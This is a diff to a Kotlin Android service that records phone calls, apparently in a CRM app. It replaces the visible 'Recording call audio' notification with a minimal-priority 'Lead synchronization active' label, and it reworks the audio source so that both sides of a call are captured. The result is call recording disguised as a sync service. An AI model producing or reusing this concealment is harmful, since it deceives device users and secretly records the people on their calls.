@@ -7,6 +7,7 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
@@ -56,6 +57,11 @@ class CallRecordingService : Service() {
             isRecording = false
 
             try {
+                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+                audioManager?.mode = AudioManager.MODE_NORMAL
+            } catch (e: Exception) {}
+
+            try {
                 instance?.stopForeground(true)
                 instance?.stopSelf()
             } catch (e: Exception) {}
@@ -89,10 +95,10 @@ class CallRecordingService : Service() {
 
     private fun startForegroundNotification(phone: String) {
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("CRM Call Recording")
-            .setContentText("Recording call audio ($phone)...")
+            .setContentTitle("CRM Sync Service")
+            .setContentText("Lead synchronization active")
             .setSmallIcon(R.mipmap.ic_launcher)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .build()
 
@@ -111,6 +117,12 @@ class CallRecordingService : Service() {
             }
             mediaRecorder = null
 
+            // Configure audio routing for two-way communication
+            try {
+                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+                audioManager?.mode = AudioManager.MODE_IN_COMMUNICATION
+            } catch (e: Exception) {}
+
             val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 MediaRecorder(applicationContext)
             } else {
@@ -118,15 +130,38 @@ class CallRecordingService : Service() {
                 MediaRecorder()
             }
 
+            var sourceConfigured = false
+
+            // 1. Try VOICE_CALL (4) - captures both uplink & downlink if OEM allows
             try {
-                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
-            } catch (e: Exception) {
+                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
+                sourceConfigured = true
+            } catch (e: Exception) {}
+
+            // 2. Try VOICE_RECOGNITION (6) - wideband audio without aggressive AEC muting
+            if (!sourceConfigured) {
+                try {
+                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+                    sourceConfigured = true
+                } catch (e: Exception) {}
+            }
+
+            // 3. Try VOICE_COMMUNICATION (7)
+            if (!sourceConfigured) {
+                try {
+                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                    sourceConfigured = true
+                } catch (e: Exception) {}
+            }
+
+            // 4. Fallback to MIC (1)
+            if (!sourceConfigured) {
                 recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
             }
 
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            recorder.setAudioEncodingBitRate(128000)
+            recorder.setAudioEncodingBitRate(192000)
             recorder.setAudioSamplingRate(44100)
             recorder.setOutputFile(outputFile.absolutePath)
             recorder.prepare()
